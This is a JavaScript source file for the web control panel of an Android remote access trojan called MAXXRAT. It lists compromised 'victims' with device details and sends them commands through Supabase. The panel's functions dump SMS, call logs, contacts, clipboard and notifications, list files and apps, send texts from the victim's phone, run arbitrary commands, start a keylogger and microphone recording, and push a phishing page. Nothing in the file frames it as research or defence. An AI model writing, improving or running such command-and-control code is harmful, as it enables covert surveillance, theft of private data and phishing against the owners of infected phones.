// MAXXRAT Web Panel - Enhanced Supabase Version
import { supabase, checkConnection } from './supabase-app.js';
import {
    getVictims,
    sendCommandToVictim,
    getVictimCommands,
    logActivity,
    getActivityLogs,
    updateVictimStatus
} from './supabase-database.js';

// Global variables with enhanced state management
let currentVictim = null;
let victimsList = [];
let commandsList = [];
let logsList = [];
let realtimeSubscriptions = [];
let connectionStatus = { connected: false, lastCheck: null };

// Enhanced initialization with connection monitoring
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

async function initializeApp() {
    try {
        // Check Supabase connection
        const connStatus = await checkConnection();
        connectionStatus = { ...connStatus, lastCheck: new Date() };

        if (!connStatus.connected) {
            showError('Failed to connect to Supabase. Please check your configuration.');
            return;
        }

        // Load victims list
        await loadVictims();

        // Set up real-time subscriptions
        setupRealtimeSubscriptions();

        // Set up periodic connection checks
        setupConnectionMonitoring();

        // Initialize UI
        updateUI();

        console.log('MAXXRAT Web Panel initialized successfully');
        showSuccess('Connected to Supabase successfully');
    } catch (error) {
        console.error('Error initializing app:', error);
        showError('Failed to initialize application: ' + error.message);
    }
}

// Enhanced victims loading with error handling
async function loadVictims() {
    try {
        const result = await getVictims();

        if (!result.success) {
            throw new Error(result.error);
        }

        victimsList = result.data || [];
        displayVictims();
    } catch (error) {
        console.error('Error loading victims:', error);
        showError('Failed to load victims list: ' + error.message);
    }
}

// Enhanced victims display with better UX
function displayVictims() {
    const usersDiv = document.getElementById('users');
    const phonesDiv = document.getElementById('phones');

    if (victimsList.length === 0) {
        usersDiv.innerHTML = `
            <center>
                <div class="no-victims">
                    <h3>No victims connected yet</h3>
                    <p>Victims will appear here when they connect to your server.</p>
                </div>
            </center>`;
        phonesDiv.style.display = 'none';
        return;
    }

    let victimsHTML = '<center><h3>Connected Victims:</h3></center><br>';
    victimsList.forEach(victim => {
        const lastSeen = new Date(victim.last_seen).toLocaleString();
        const statusClass = victim.status === 'online' ? 'online' : 'offline';
        const statusText = victim.status === 'online' ? '🟢 Online' : '🔴 Offline';

        victimsHTML += `
            <div class="victim-item ${statusClass}" onclick="selectVictim('${victim.id}')" role="button" tabindex="0">
                <div class="victim-header">
                    <strong>${victim.device_name || 'Unknown Device'}</strong>
                    <span class="status-indicator">${statusText}</span>
                </div>
                <div class="victim-details">
                    <small>Model: ${victim.device_model || 'Unknown'}</small><br>
                    <small>Android: ${victim.android_version || 'Unknown'}</small><br>
                    <small>Last seen: ${lastSeen}</small>
                </div>
            </div>
        `;
    });

    usersDiv.innerHTML = victimsHTML;
    phonesDiv.style.display = 'block';
}

// Enhanced victim selection
function selectVictim(victimId) {
    currentVictim = victimsList.find(v => v.id === victimId);
    if (currentVictim) {
        document.getElementById('phones').style.display = 'block';
        updateVictimInfo();

        // Mark victim as selected
        document.querySelectorAll('.victim-item').forEach(item => {
            item.classList.remove('selected');
        });
        event.currentTarget.classList.add('selected');

        // Load victim's command history
        loadVictimCommands();
        loadVictimLogs();
    }
}

// Enhanced real-time subscriptions
function setupRealtimeSubscriptions() {
    // Clean up existing subscriptions
    realtimeSubscriptions.forEach(sub => sub.unsubscribe());
    realtimeSubscriptions = [];

    // Subscribe to victims table changes
    const victimsSubscription = supabase
        .channel('victims_changes')
        .on('postgres_changes', {
            event: '*',
            schema: 'public',
            table: 'victims'
        }, (payload) => {
            console.log('Victims table changed:', payload);
            loadVictims();
        })
        .subscribe();

    // Subscribe to commands table changes
    const commandsSubscription = supabase
        .channel('commands_changes')
        .on('postgres_changes', {
            event: '*',
            schema: 'public',
            table: 'commands'
        }, (payload) => {
            console.log('Commands table changed:', payload);
            if (currentVictim && payload.new?.victim_id === currentVictim.id) {
                loadVictimCommands();
            }
        })
        .subscribe();

    // Subscribe to logs table changes
    const logsSubscription = supabase
        .channel('logs_changes')
        .on('postgres_changes', {
            event: '*',
            schema: 'public',
            table: 'logs'
        }, (payload) => {
            console.log('Logs table changed:', payload);
            if (currentVictim && payload.new?.victim_id === currentVictim.id) {
                loadVictimLogs();
            }
        })
        .subscribe();

    realtimeSubscriptions = [victimsSubscription, commandsSubscription, logsSubscription];
}

// Connection monitoring
function setupConnectionMonitoring() {
    setInterval(async () => {
        const connStatus = await checkConnection();
        connectionStatus = { ...connStatus, lastCheck: new Date() };

        if (!connStatus.connected && connectionStatus.connected) {
            showError('Lost connection to Supabase');
        } else if (connStatus.connected && !connectionStatus.connected) {
            showSuccess('Reconnected to Supabase');
        }

        connectionStatus.connected = connStatus.connected;
    }, 30000); // Check every 30 seconds
}

// Enhanced command loading
async function loadVictimCommands() {
    if (!currentVictim) return;

    try {
        const result = await getVictimCommands(currentVictim.id, { limit: 50 });

        if (!result.success) {
            throw new Error(result.error);
        }

        commandsList = result.data || [];
        displayCommands();
    } catch (error) {
        console.error('Error loading commands:', error);
        showError('Failed to load commands: ' + error.message);
    }
}

// Enhanced logs loading
async function loadVictimLogs() {
    if (!currentVictim) return;

    try {
        const result = await getActivityLogs(currentVictim.id, { limit: 100 });

        if (!result.success) {
            throw new Error(result.error);
        }

        logsList = result.data || [];
        displayLogs();
    } catch (error) {
        console.error('Error loading logs:', error);
        showError('Failed to load logs: ' + error.message);
    }
}

// Enhanced command sending with better error handling
async function sendCommand(commandType, parameters = {}) {
    if (!currentVictim) {
        showError('No victim selected');
        return;
    }

    try {
        const result = await sendCommandToVictim(currentVictim.id, commandType, parameters);

        if (!result.success) {
            throw new Error(result.error);
        }

        // Log the command
        await logActivity(currentVictim.id, 'command_sent', {
            command_type: commandType,
            parameters: parameters
        });

        console.log('Command sent:', result.data);
        showSuccess('Command sent successfully');
    } catch (error) {
        console.error('Error sending command:', error);
        showError('Failed to send command: ' + error.message);
    }
}

// Enhanced UI updates
function updateUI() {
    // Update connection status indicator
    updateConnectionStatus();

    // Update any other UI elements that need refreshing
    console.log('UI updated');
}

// Connection status indicator
function updateConnectionStatus() {
    const statusIndicator = document.getElementById('connection-status') ||
        createConnectionStatusIndicator();

    if (connectionStatus.connected) {
        statusIndicator.innerHTML = '🟢 Connected';
        statusIndicator.className = 'connection-status connected';
    } else {
        statusIndicator.innerHTML = '🔴 Disconnected';
        statusIndicator.className = 'connection-status disconnected';
    }
}

function createConnectionStatusIndicator() {
    const indicator = document.createElement('div');
    indicator.id = 'connection-status';
    indicator.className = 'connection-status';
    indicator.style.cssText = `
        position: fixed;
        top: 10px;
        right: 10px;
        padding: 5px 10px;
        border-radius: 5px;
        font-size: 12px;
        z-index: 1000;
    `;
    document.body.appendChild(indicator);
    return indicator;
}

// Enhanced error handling
function showError(message) {
    console.error(message);

    // Create or update error notification
    let errorDiv = document.getElementById('error-notification');
    if (!errorDiv) {
        errorDiv = document.createElement('div');
        errorDiv.id = 'error-notification';
        errorDiv.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #ff4444;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            z-index: 10000;
            max-width: 80%;
        `;
        document.body.appendChild(errorDiv);
    }

    errorDiv.textContent = message;
    errorDiv.style.display = 'block';

    // Auto-hide after 5 seconds
    setTimeout(() => {
        errorDiv.style.display = 'none';
    }, 5000);
}

// Enhanced success handling
function showSuccess(message) {
    console.log(message);

    // Create or update success notification
    let successDiv = document.getElementById('success-notification');
    if (!successDiv) {
        successDiv = document.createElement('div');
        successDiv.id = 'success-notification';
        successDiv.style.cssText = `
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #44ff44;
            color: black;
            padding: 10px 20px;
            border-radius: 5px;
            z-index: 10000;
            max-width: 80%;
        `;
        document.body.appendChild(successDiv);
    }

    successDiv.textContent = message;
    successDiv.style.display = 'block';

    // Auto-hide after 3 seconds
    setTimeout(() => {
        successDiv.style.display = 'none';
    }, 3000);
}

// Enhanced victim info update
function updateVictimInfo() {
    if (!currentVictim) return;

    // Update any victim-specific UI elements here
    console.log('Selected victim:', currentVictim.device_name);

    // Update page title with victim info
    document.title = `MAXXRAT - ${currentVictim.device_name || 'Unknown Device'}`;
}

// Display functions (placeholders for now)
function displayCommands() {
    console.log('Commands loaded:', commandsList.length);
    // Implementation for displaying commands in UI
}

function displayLogs() {
    console.log('Logs loaded:', logsList.length);
    // Implementation for displaying logs in UI
}

// Export functions for global access
window.selectVictim = selectVictim;
window.sendCommand = sendCommand;

// RAT Functions (enhanced versions)
function dumpsms() {
    sendCommand('dump_sms');
}

function calllogs() {
    sendCommand('dump_call_logs');
}

function filesmanager() {
    sendCommand('list_files');
}

function getpackages() {
    sendCommand('get_installed_apps');
}

function deviceinfo() {
    sendCommand('get_device_info');
}

function dumpcontact() {
    sendCommand('dump_contacts');
}

function sendmsg() {
    const phone = prompt('Enter phone number:');
    const message = prompt('Enter message:');
    if (phone && message) {
        sendCommand('send_sms', { phone, message });
    }
}

function funcmd(cmd) {
    sendCommand('custom_command', { command: cmd });
}

function keylogger() {
    sendCommand('start_keylogger');
}

function changewallpaper() {
    const url = prompt('Enter wallpaper URL:');
    if (url) {
        sendCommand('change_wallpaper', { url });
    }
}

function notificationlog() {
    sendCommand('get_notifications');
}

function showphish() {
    sendCommand('show_phishing_page');
}

function micrec() {
    sendCommand('start_recording');
}

function showclip() {
    sendCommand('get_clipboard');
}

// Cleanup on page unload
window.addEventListener('beforeunload', () => {
    // Clean up subscriptions
    realtimeSubscriptions.forEach(sub => sub.unsubscribe());
});